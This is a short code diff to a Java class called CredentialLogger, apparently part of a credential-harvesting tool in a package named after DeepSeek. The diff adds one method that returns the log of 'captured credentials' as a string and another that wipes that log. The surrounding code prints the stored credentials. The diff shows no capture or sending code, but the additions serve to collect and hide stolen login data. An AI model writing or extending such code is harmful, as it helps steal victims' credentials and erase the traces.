@@ -3,6 +3,8 @@ package org.guercifzone.DeepSeek;
 
 
 import java.io.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
@@ -23,7 +25,22 @@ public class CredentialLogger {
             System.err.println("Error writing to log file: " + e.getMessage());
         }
     }
+    // Add these methods to the CredentialLogger class
+    public static String getLogsAsString() {
+        try {
+            return new String(Files.readAllBytes(Paths.get(LOG_FILE)));
+        } catch (IOException e) {
+            return "No credentials captured yet or error reading logs.";
+        }
+    }
 
+    public static void clearLogs() {
+        try {
+            Files.write(Paths.get(LOG_FILE), new byte[0]);
+        } catch (IOException e) {
+            System.err.println("Error clearing log file: " + e.getMessage());
+        }
+    }
     public static void viewLogs() {
         System.out.println("\n--- Captured Credentials ---");
         try (BufferedReader reader = new BufferedReader(new FileReader(LOG_FILE))) {
